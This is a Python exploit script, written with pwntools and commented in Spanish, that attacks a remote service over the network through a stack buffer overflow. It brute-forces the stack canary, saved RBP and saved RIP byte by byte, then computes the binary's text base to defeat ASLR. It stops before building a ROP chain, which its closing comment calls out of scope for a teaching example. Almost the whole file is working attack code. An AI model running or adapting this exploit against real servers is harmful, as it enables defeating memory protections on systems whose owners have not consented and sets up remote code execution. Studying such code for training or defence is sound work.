#!/usr/bin/env python3
# coding: utf-8

from pwn import *
import sys

# -------------------------------------------------------------------
# 1. Parámetros de línea de comandos: IP y puerto del servidor vulnerable
# -------------------------------------------------------------------
if len(sys.argv) != 5:
    print(f"Uso: {sys.argv[0]} -s <IP_servidor> -p <puerto>")
    sys.exit(1)

# Extraer los pares -s <IP> y -p <puerto>
ip = None
port = None
for i in range(1, len(sys.argv), 2):
    if sys.argv[i] == '-s':
        ip = sys.argv[i+1]
    elif sys.argv[i] == '-p':
        port = int(sys.argv[i+1])

if ip is None or port is None:
    print("Falta la dirección o el puerto.")
    sys.exit(1)

# -------------------------------------------------------------------
# 2. Función para probar conectividad al servidor
# -------------------------------------------------------------------
def conectar():
    try:
        # Timeout ajustable en segundos
        return remote(ip, port, timeout=2)
    except Exception as e:
        print(f"[-] Error al conectar con {ip}:{port} -> {e}")
        return None

# -------------------------------------------------------------------
# 3. Descubrir el offset al canario
# -------------------------------------------------------------------
# En este ejemplo, el script imprime "Offset is 56 bytes". Esto se suele
# obtener mediante una técnica automática que consiste en enviar secuencias
# de 'A's crecientes hasta provocar el crash y ver dónde se sobreescribe el canario.
# Simplificaremos: asumiremos que el offset es fijo (56).
# -------------------------------------------------------------------
OFFSET_CANARY = 56
log.info(f"[+] Exploit ASLR 64 bit systems")
log.info(f"[+] Trying to find out the canary offset")
log.info(f"[+] Offset is {OFFSET_CANARY} bytes")

# -------------------------------------------------------------------
# 4. Brute forcing del stack canary (byte a byte)
# -------------------------------------------------------------------
# En 64 bits, el canario ocupa 8 bytes (unsigned long). A menudo su
# primer byte es 0x00 (por conveniencia de formato de strings), pero no
# se debe asumir sin comprobar.
# -------------------------------------------------------------------
canary = b""
log.info("[+] Brute forcing stack canary")

for i in range(8):  # Cada byte del canario
    for guess in range(0x00, 0x100):
        # Construir payload con el byte actual adivinando
        trial = canary + p8(guess)
        # Rellenar hasta el offset-canario
        padding = b"A" * (OFFSET_CANARY - len(trial))
        payload = padding + trial
        # Tras el canario correcto, hay que añadir 8 bytes de dummy para EBP
        # y luego 8 bytes de dummy para EIP, para que la función pueda retornar
        payload += b"B" * 8  # Saved RBP
        payload += b"C" * 8  # Saved RIP
        payload += b"\n"     # Si el servidor espera un salto de línea

        # Intenta conectar y enviar el payload
        conn = conectar()
        if not conn:
            continue  # Si no hay conexión, pruebe el siguiente valor

        try:
            conn.send(payload)
            # Leer algo de respuesta o cerrar la conexión tras un pequeño delay
            conn.recv(timeout=0.5)
            # Si no hay crash (no EOF), es probable que el byte sea correcto
            canary += p8(guess)
            conn.close()
            break  # Sale del bucle interno – pasa al próximo byte
        except EOFError:
            # Crash detectado: el byte es erróneo. Probar siguiente.
            conn.close()
            continue
    else:
        # Si no se ha roto el bucle con 'break', no se encontró el byte correcto
        log.error(f"[-] No se encontró el byte {i}-ésimo del canario.")
        sys.exit(1)

log.success(f"[+] SSP value is {hex(u64(canary))}")

# -------------------------------------------------------------------
# 5. Brute forcing del Saved RBP (antiguo RBP)
# -------------------------------------------------------------------
# Tras conocer el canario, reconstruimos el payload con canario correcto,
# y ahora buscamos los 8 bytes de Saved RBP. Pero, en entornos modernos,
# el valor de RBP suele apuntar a una dirección cercana al stack actual,
# lo que facilita conocer la parte alta (p.ej. 0x00007ffd694d4xxxx).
# Se puede optar por forzar solo los últimos bytes útiles (por ejemplo, 
# solo los 6 bytes menos significativos) para ahorrar iteraciones.
# -------------------------------------------------------------------
saved_rbp = b""
log.info("[+] Brute forcing EBP")

# Normalmente, en 64 bits, RBP se alinea en 8 bytes y podría empezar
# con 0x00 0x7f 0xff ... etc. Suponiendo un entorno little-endian:
for i in range(8):
    for guess in range(0x00, 0x100):
        trial_rbp = saved_rbp + p8(guess)
        padding = b"A" * OFFSET_CANARY
        payload = padding + canary
        payload += trial_rbp
        # Ahora falta rellenar hasta saved RIP, con 8 bytes dummy
        payload += b"D" * (8 - len(saved_rbp) - 1)  # Para completar los 8 bytes
        payload += b"E" * 8  # Para que haya placeholder de RIP
        payload += b"\n"

        conn = conectar()
        if not conn:
            continue

        try:
            conn.send(payload)
            conn.recv(timeout=0.5)
            saved_rbp += p8(guess)
            conn.close()
            break
        except EOFError:
            conn.close()
            continue
    else:
        log.error(f"[-] No se encontró el byte {i}-ésimo de saved RBP.")
        sys.exit(1)

log.success(f"[+] EBP value is {hex(u64(saved_rbp))}")

# -------------------------------------------------------------------
# 6. Brute forcing del Saved RIP (antiguo RIP)
# -------------------------------------------------------------------
saved_rip = b""
log.info("[+] Brute forcing Saved EIP")

for i in range(8):
    for guess in range(0x00, 0x100):
        trial_rip = saved_rip + p8(guess)
        payload = b"A" * OFFSET_CANARY
        payload += canary
        payload += saved_rbp
        payload += trial_rip
        # Aquí no hay más bytes tras saved RIP, pero puede necesitar
        # un salto de línea final para el servidor
        payload += b"\n"

        conn = conectar()
        if not conn:
            continue

        try:
            conn.send(payload)
            conn.recv(timeout=0.5)
            saved_rip += p8(guess)
            conn.close()
            break
        except EOFError:
            conn.close()
            continue
    else:
        log.error(f"[-] No se encontró el byte {i}-ésimo de saved RIP.")
        sys.exit(1)

log.success(f"[+] EIP value is {hex(u64(saved_rip))}")

# -------------------------------------------------------------------
# 7. Cálculo de la base de texto (Text Base)
# -------------------------------------------------------------------
# Supongamos que el offset dentro del binario donde guardó RIP fue
# exactamente el inicio de la función vulnerable. Si, por ejemplo, se sabe
# que el overflow se produce en la función "vulnerable", cuyo offset
# (en el binario sin ASLR) es 0xff4 dentro de .text, entonces:
offset_vulnerable = 0xff4
base_text = u64(saved_rip) - offset_vulnerable
log.success(f"[+] Text Base at {hex(base_text)}")

# -------------------------------------------------------------------
# 8. Conclusión: disponemos de canary, saved RBP, saved RIP y base de texto
#    A partir de ahora, se pueden buscar gadgets en el binario local y
#    construir un payload final – por ejemplo, un ROP chain para ejecutar
#    "/bin/sh" u otra función "win". Pero eso escapa al alcance de este
#    ejemplo didáctico, que se centra en la propia extracción de datos.
# -------------------------------------------------------------------
